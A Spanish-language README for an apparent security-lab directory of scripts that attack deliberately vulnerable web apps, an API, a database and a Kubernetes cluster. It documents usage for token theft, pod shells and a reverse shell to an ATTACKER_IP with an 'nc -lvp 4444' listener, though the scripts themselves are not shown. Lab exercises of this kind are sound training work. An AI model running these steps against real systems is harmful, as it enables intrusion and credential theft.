# Scripts de Explotación y Movimiento Lateral

Este directorio contiene scripts para explotar las vulnerabilidades de las aplicaciones desplegadas y realizar movimiento lateral en la infraestructura.

## ⚠️ Advertencia

Estos scripts están diseñados **únicamente para un entorno de laboratorio de seguridad**. No uses estos scripts en sistemas de producción o sin autorización explícita.

## Scripts Disponibles

### 1. `exploit-web-app.sh`
Explota vulnerabilidades en la aplicación web vulnerable.

**Uso:**
```bash
./exploit-web-app.sh <URL_BASE>
```

**Ejemplo:**
```bash
# Desde el bastión, después de configurar port-forward
kubectl port-forward -n vulnerable-apps svc/vulnerable-web-app 3000:3000 &
./exploit-web-app.sh http://localhost:3000
```

**Vulnerabilidades explotadas:**
- XSS (Cross-Site Scripting)
- SQL Injection
- Path Traversal
- Command Injection
- Exposición de secretos
- Información de debug

### 2. `exploit-api.sh`
Explota vulnerabilidades en la API vulnerable.

**Uso:**
```bash
./exploit-api.sh <URL_BASE>
```

**Ejemplo:**
```bash
kubectl port-forward -n vulnerable-apps svc/vulnerable-api 5000:5000 &
./exploit-api.sh http://localhost:5000
```

**Vulnerabilidades explotadas:**
- Command Injection
- Path Traversal
- SSRF (Server-Side Request Forgery)
- Autenticación débil
- Exposición de variables de entorno
- Deserialización insegura (Pickle, YAML)

### 3. `exploit-database.sh`
Explota la base de datos vulnerable con credenciales débiles.

**Uso:**
```bash
./exploit-database.sh <HOST> [PORT]
```

**Ejemplo:**
```bash
kubectl port-forward -n vulnerable-apps svc/vulnerable-database 3306:3306 &
./exploit-database.sh localhost 3306
```

**Vulnerabilidades explotadas:**
- Credenciales débiles (root/root123, admin/admin123, test/test123)
- Permisos excesivos
- Lectura de datos sensibles
- Lectura de archivos del sistema

### 4. `lateral-movement.sh`
Realiza movimiento lateral desde el bastión al cluster Kubernetes.

**Uso:**
```bash
./lateral-movement.sh
```

**Requisitos:**
- Acceso al bastión
- AWS CLI configurado
- Permisos para acceder al cluster EKS

**Acciones realizadas:**
- Configuración de kubectl
- Enumeración de namespaces, pods, servicios
- Búsqueda de secretos y configmaps
- Verificación de permisos
- Identificación de pods privilegiados

### 5. `exploit-k8s.sh`
Explota vulnerabilidades en la configuración del cluster Kubernetes.

**Uso:**
```bash
./exploit-k8s.sh [NAMESPACE]
```

**Ejemplo:**
```bash
./exploit-k8s.sh vulnerable-apps
```

**Vulnerabilidades explotadas:**
- Security context privilegiado
- Lectura de secretos
- Acceso a service account tokens
- Variables de entorno sensibles
- Posibles escapes de contenedor

### 6. `enumerate-resources.sh`
Enumera todos los recursos del cluster Kubernetes.

**Uso:**
```bash
./enumerate-resources.sh
```

**Recursos enumerados:**
- Nodos, namespaces, pods
- Servicios, deployments, statefulsets
- ConfigMaps, secrets, service accounts
- Roles, role bindings, cluster roles
- Ingress, persistent volumes
- Network policies

### 7. `get-shell.sh`
Obtiene una shell interactiva en un pod.

**Uso:**
```bash
./get-shell.sh [NAMESPACE] [POD_NAME]
```

**Ejemplo:**
```bash
./get-shell.sh vulnerable-apps vulnerable-web-app-xxx
```

### 8. `steal-service-account-token.sh`
Roba tokens de service accounts de pods y los usa para acceso.

**Uso:**
```bash
./steal-service-account-token.sh [NAMESPACE] [POD_NAME]
```

**Ejemplo:**
```bash
./steal-service-account-token.sh vulnerable-apps vulnerable-web-app-xxx
```

**Acciones realizadas:**
- Extrae tokens de service accounts
- Crea contexto de kubectl con el token robado
- Verifica permisos del token
- Guarda información para uso posterior

### 9. `reverse-shell.sh`
Establece un reverse shell desde un pod al atacante.

**Uso:**
```bash
./reverse-shell.sh <NAMESPACE> <POD_NAME> <ATTACKER_IP> <ATTACKER_PORT>
```

**Ejemplo:**
```bash
# En el atacante (bastión):
nc -lvp 4444

# Ejecutar el script:
./reverse-shell.sh vulnerable-apps vulnerable-web-app-xxx <BASTION_IP> 4444
```

**Métodos soportados:**
- bash
- netcat (nc)
- python
- perl
- php

### 10. `master-exploit.sh`
Script maestro que ejecuta todos los scripts de explotación en secuencia.

**Uso:**
```bash
./master-exploit.sh
```

**Acciones realizadas:**
1. Configuración de acceso al cluster
2. Enumeración de recursos
3. Movimiento lateral
4. Explotación de aplicaciones vulnerables
5. Explotación de vulnerabilidades de Kubernetes

## Flujo de Trabajo Recomendado

### Desde tu máquina local:

1. **Conectarse al bastión:**
```bash
ssh -p 22222 -i ~/.ssh/bastion_key ubuntu@<BASTION_IP>
```

2. **Configurar acceso al cluster:**
```bash
export AWS_REGION=<tu-region>
export CLUSTER_NAME=lab-cluster
aws eks update-kubeconfig --region $AWS_REGION --name $CLUSTER_NAME
```

3. **Copiar scripts al bastión:**
```bash
# Desde tu máquina local
scp -P 22222 -i ~/.ssh/bastion_key -r exploitation/ ubuntu@<BASTION_IP>:~/
```

4. **Ejecutar scripts de explotación:**
```bash
# En el bastión
cd ~/exploitation
chmod +x *.sh
./master-exploit.sh
```

### Desde el bastión directamente:

Si los scripts ya están en el bastión:

```bash
cd exploitation
./master-exploit.sh
```

## Ejemplos de Uso Individual

### Explotar aplicación web:

```bash
# Configurar port-forward
kubectl port-forward -n vulnerable-apps svc/vulnerable-web-app 3000:3000 &

# Ejecutar explotación
./exploit-web-app.sh http://localhost:3000
```

### Explotar API:

```bash
# Configurar port-forward
kubectl port-forward -n vulnerable-apps svc/vulnerable-api 5000:5000 &

# Ejecutar explotación
./exploit-api.sh http://localhost:5000
```

### Explotar base de datos:

```bash
# Configurar port-forward
kubectl port-forward -n vulnerable-apps svc/vulnerable-database 3306:3306 &

# Ejecutar explotación
./exploit-database.sh localhost 3306
```

### Obtener shell en un pod:

```bash
# Listar pods
kubectl get pods -n vulnerable-apps

# Obtener shell
./get-shell.sh vulnerable-apps <pod-name>
```

### Robar token de service account:

```bash
# Robar token y crear contexto
./steal-service-account-token.sh vulnerable-apps <pod-name>

# Usar el contexto robado
kubectl --context=stolen-context get pods
```

### Establecer reverse shell:

```bash
# En el atacante (bastión), iniciar listener:
nc -lvp 4444

# Desde otro terminal, ejecutar:
./reverse-shell.sh vulnerable-apps <pod-name> <BASTION_IP> 4444
```

## Troubleshooting

### Error: "kubectl: command not found"
```bash
# Instalar kubectl
curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
chmod +x kubectl
sudo mv kubectl /usr/local/bin/
```

### Error: "Unable to connect to the server"
```bash
# Verificar configuración del cluster
aws eks update-kubeconfig --region <region> --name lab-cluster
kubectl cluster-info
```

### Error: "Permission denied"
```bash
# Verificar permisos
kubectl auth can-i --list
```

### Port-forward no funciona
```bash
# Verificar que el servicio existe
kubectl get services -n vulnerable-apps

# Verificar que los pods están running
kubectl get pods -n vulnerable-apps
```

## Notas Importantes

1. **Port-forwarding:** Los scripts que requieren acceso a servicios usan port-forwarding. Asegúrate de que los port-forwards estén activos antes de ejecutar los scripts.

2. **Permisos:** Algunos scripts requieren permisos específicos en el cluster. Asegúrate de tener los permisos necesarios.

3. **Dependencias:** Algunos scripts requieren herramientas adicionales como `jq`, `mysql-client`, `python3`. Instálalas si es necesario.

4. **Seguridad:** Estos scripts están diseñados para un laboratorio. En producción, estas vulnerabilidades serían críticas y deben ser corregidas inmediatamente.

## Próximos Pasos

Después de explotar las vulnerabilidades, puedes:

1. **Documentar los hallazgos:** Crea un reporte de las vulnerabilidades encontradas
2. **Crear fixes:** Desarrolla parches para las vulnerabilidades
3. **Implementar controles:** Agrega controles de seguridad para prevenir estas vulnerabilidades
4. **Monitoreo:** Implementa monitoreo para detectar intentos de explotación

## Referencias

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Kubernetes Security Best Practices](https://kubernetes.io/docs/concepts/security/)
- [AWS EKS Security](https://docs.aws.amazon.com/eks/latest/userguide/security.html)

